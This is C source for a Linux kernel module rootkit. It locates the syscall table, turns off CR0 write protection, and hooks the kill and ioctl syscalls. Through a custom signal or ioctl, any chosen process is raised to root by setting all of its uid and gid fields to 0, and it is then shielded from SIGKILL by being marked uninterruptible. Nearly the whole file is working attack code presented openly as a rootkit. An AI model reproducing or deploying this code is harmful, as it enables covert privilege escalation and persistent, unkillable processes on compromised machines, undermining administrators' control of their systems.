#include "process_protection.h"

/* assistant functions */
asmlinkage long (* org_kill)(const struct pt_regs * pt_regs);
asmlinkage long new_kill(const struct pt_regs * pt_regs);
asmlinkage long (* org_ioctl)(const struct pt_regs * pt_regs);
asmlinkage long new_ioctl(const struct pt_regs * pt_regs);
unsigned long ** find_sys_call_table(void);
void write_cr0_forced(unsigned long val);
void enable_write_protection(void);
void disable_write_protection(void);
struct task_struct * find_proc_by_pid(pid_t pid);
int is_proc_protected(pid_t pid);
int proc_protect(pid_t pid);
int proc_unprotect(pid_t pid);
int copy_int_from_user(char * arg);

/* system call table */
unsigned long ** sys_call_table;

/* protected process list */
struct list_head protected_pids_list;

int init_rootkit(void) {
    /* init protected process list */
    INIT_LIST_HEAD(&protected_pids_list);
    printk("init protected pids list\n");

    /* get system call table */
    sys_call_table = (unsigned long **) find_sys_call_table();
    if (sys_call_table == NULL) {
        printk("failed to get sys_call_table\n");
        return -1;
    }

    /* save org syscalls */
    org_ioctl = (void *) sys_call_table[__NR_ioctl];
    printk("org_ioctl = 0x%lx\n", (unsigned long) org_ioctl);
    org_kill = (void *) sys_call_table[__NR_kill];
    printk("org_kill = 0x%lx\n", (unsigned long) org_kill);

    /* forge syscalls */
    disable_write_protection();
    printk("new_ioctl = 0x%lx\n", (unsigned long) new_ioctl);
    sys_call_table[__NR_ioctl] = (void *) new_ioctl;
    printk("hook SYS_ioctl @ 0x%lx\n", (unsigned long) &sys_call_table[__NR_ioctl]);
    printk("new_kill = 0x%lx\n", (unsigned long) new_kill);
    sys_call_table[__NR_kill] = (void *) new_kill;
    printk("hook SYS_kill @ 0x%lx\n", (unsigned long) &sys_call_table[__NR_kill]);
    enable_write_protection();

    return 0;
}

void exit_rootkit(void) {
    struct list_head * l, * next;
    struct protected_pids * p;

    /* clean protected process list */
    list_for_each_safe(l, next, &protected_pids_list) {
        p = list_entry(l, struct protected_pids, list);
        printk("remove %d from protected pids list\n", p->pid);
        list_del(l);
        printk("free %d protected pids structure\n", p->pid);
        kfree(p);
    }
    printk("clean protected pids list\n");

    /* restore syscalls */
    disable_write_protection();
    sys_call_table[__NR_ioctl] = (void *) org_ioctl;
    printk("restore SYS_ioctl\n");
    sys_call_table[__NR_kill] = (void *) org_kill;
    printk("restore SYS_kill\n");
    enable_write_protection();
}

int proc_protect(pid_t pid) {
    /* https://onestraw.github.io/linux/linux-struct-cred/ */
    /* https://arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/ */
    /* https://blog.csdn.net/bin_linux96/article/details/105889045 */
    /* https://www.quora.com/Linux-Kernel-What-is-the-relationship-between-kthread-and-task_struct-structure */
    struct cred * pcred;
    struct task_struct * task = find_proc_by_pid(pid);
    struct protected_pids * p = (struct protected_pids *) kmalloc(sizeof(* p), GFP_KERNEL);

    if (task == NULL) {
        printk("process %d's task_struct not found\n", pid);
        return -1;
    }

    /* get process creds */
    pcred = (struct cred *)task->cred;

    /* add to protected pids list */
    /* save the cred */
    INIT_LIST_HEAD(&p->list);
    p->pid = pid;
    p->cred_prev.uid.val = pcred->uid.val;
    p->cred_prev.euid.val = pcred->euid.val;
    p->cred_prev.suid.val = pcred->suid.val;
    p->cred_prev.fsuid.val = pcred->fsuid.val;
    p->cred_prev.gid.val = pcred->gid.val;
    p->cred_prev.egid.val = pcred->egid.val;
    p->cred_prev.sgid.val = pcred->sgid.val;
    p->cred_prev.fsgid.val = pcred->fsgid.val;
    list_add_tail(&p->list, &protected_pids_list);
    /* save the state */
    p->state_prev = task->state;
    /* save the mm_struct */
    p->mm_prev = task->mm;
    printk("add %d to protected pids list\n", pid);

	/* escalate to root */
	pcred->uid.val = pcred->euid.val = 0;
	pcred->suid.val = pcred->fsuid.val = 0;
	pcred->gid.val = pcred->egid.val = 0;
	pcred->sgid.val = pcred->fsgid.val = 0;

    /* set process to uninterruptible */
    task->state = TASK_UNINTERRUPTIBLE;

    /* set process as a kernel thread */
    task->mm = NULL;

    return 0;
}

int proc_unprotect(pid_t pid) {
    struct cred * pcred;
    struct task_struct * task = find_proc_by_pid(pid);
    struct list_head * l, * next;
    struct protected_pids * p = NULL;

    if (task == NULL) {
        printk("process %d's task_struct not found\n", pid);
        return -1;
    }

    list_for_each_safe(l, next, &protected_pids_list) {
        p = list_entry(l, struct protected_pids, list);
        if (p->pid == pid) {
            list_del(l);
            break;
        }
    }
    if (p == NULL) {
        printk("process %d is not in protected pids list\n", pid);
        return -1;
    }
    printk("delete %d from protected pids list\n", pid);

    /* get process creds */
    pcred = (struct cred *)task->cred;

	/* restore */
	pcred->uid.val = p->cred_prev.uid.val;
	pcred->euid.val = p->cred_prev.euid.val;
	pcred->suid.val = p->cred_prev.suid.val;
	pcred->fsuid.val = p->cred_prev.fsuid.val;
	pcred->gid.val = p->cred_prev.gid.val;
	pcred->egid.val = p->cred_prev.egid.val;
	pcred->sgid.val = p->cred_prev.sgid.val;
	pcred->fsgid.val = p->cred_prev.fsgid.val;
    task->state = p->state_prev;
    task->mm = p->mm_prev;

    kfree(p);

    return 0;
}

asmlinkage long new_kill(const struct pt_regs * pt_regs) {
    int protected;
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;

    switch (sig) {
        /* upgrade process priviledge */
        case SIG_PROC_PROT:
            if ((protected = is_proc_protected(pid)) == 0) {
                if (proc_protect(pid) != 0) {
                    printk("error: proc_protect() failed\n");
                    return -1;
                }
            } else {
                printk("process %d is protected\n", pid);
            }
            break;
        case SIG_PROC_UNPROT:
            if ((protected = is_proc_protected(pid)) == 1) {
                if (proc_unprotect(pid) != 0) {
                    printk("error: proc_unprotect() failed\n");
                    return -1;
                }
            } else {
                printk("process %d is unprotected\n", pid);
            }
            break;
        /* protect process from kill */
        case SIGKILL:
            if ((protected = is_proc_protected(pid)) == 1) {
                printk("can not kill the process\n");
            } else { /* execute normal SYS_kill */
                return (* org_kill)(pt_regs);
            }
            break;
        default:
            return (* org_kill)(pt_regs);
    }
    return 0;
}

int copy_int_from_user(char * arg) {
    int rv, r;
    char buf[IOCTL_ARGP_SIZE] = {0};

    if ((rv = copy_from_user(buf, arg, IOCTL_ARGP_SIZE)) != 0) {
        printk("error [%d]: copy_from_user() failed\n", rv);
        return -1;
    }

    if ((rv = kstrtoint(buf, 10, &r)) != 0) {
        printk("error [%d]: pid should be a integer\n", rv);
        return -1;
    }

    return r;
}

asmlinkage long new_ioctl(const struct pt_regs * pt_regs) {
    int protected;
    int cmd = (int) pt_regs->si;
    char * arg = (char *) pt_regs->dx;
    pid_t pid;

    switch (cmd) {
        case IOCTL_PROC_PROT:
            if ((pid = copy_int_from_user(arg)) == -1) {
                printk("error: copy_int_from_user() failed\n");
                return -1;
            }
            printk("pid = %d\n", pid);
            if ((protected = is_proc_protected(pid)) == 0) {
                if (proc_protect(pid) != 0) {
                    printk("error: proc_protect() failed\n");
                    return -1;
                }
            } else {
                printk("process %d is protected\n", pid);
            }
            break;
        case IOCTL_PROC_UNPROT:
            if ((pid = copy_int_from_user(arg)) == -1) {
                printk("error: copy_int_from_user() failed\n");
                return -1;
            }
            printk("pid = %d\n", pid);
            if ((protected = is_proc_protected(pid)) == 1) {
                if (proc_unprotect(pid) != 0) {
                    printk("error: proc_unprotect() failed\n");
                    return -1;
                }
            } else {
                printk("process %d is unprotected\n", pid);
            }
            break;
        default:
            return (* org_ioctl)(pt_regs);
    }

    return 0;
}

int is_proc_protected(pid_t pid) {
    struct list_head * l, * next;
    struct protected_pids * p;

    list_for_each_safe(l, next, &protected_pids_list) {
        p = list_entry(l, struct protected_pids, list);
        if (p->pid == pid) {
            return 1;
        }
    }

    return 0;
}

struct task_struct * find_proc_by_pid(pid_t pid) {
    struct task_struct * p;

    for_each_process(p) {
        if (p->pid == pid) {
            printk("found task_struct @ 0x%lx\n", (unsigned long) p);
            return p;
        }
    }

    printk("error finding task_struct\n");
    return NULL;
}

unsigned long ** find_sys_call_table(void) {
    return (unsigned long **) kallsyms_lookup_name("sys_call_table");
}

/* https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c */
/* https://stackoverflow.com/questions/58512430/how-to-write-to-protected-pages-in-the-linux-kernel */
void write_cr0_forced(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* enable writing sys_call_table */
void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0_forced(cr0);
}

/* disable writing sys_call_table */
void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0_forced(cr0);
}

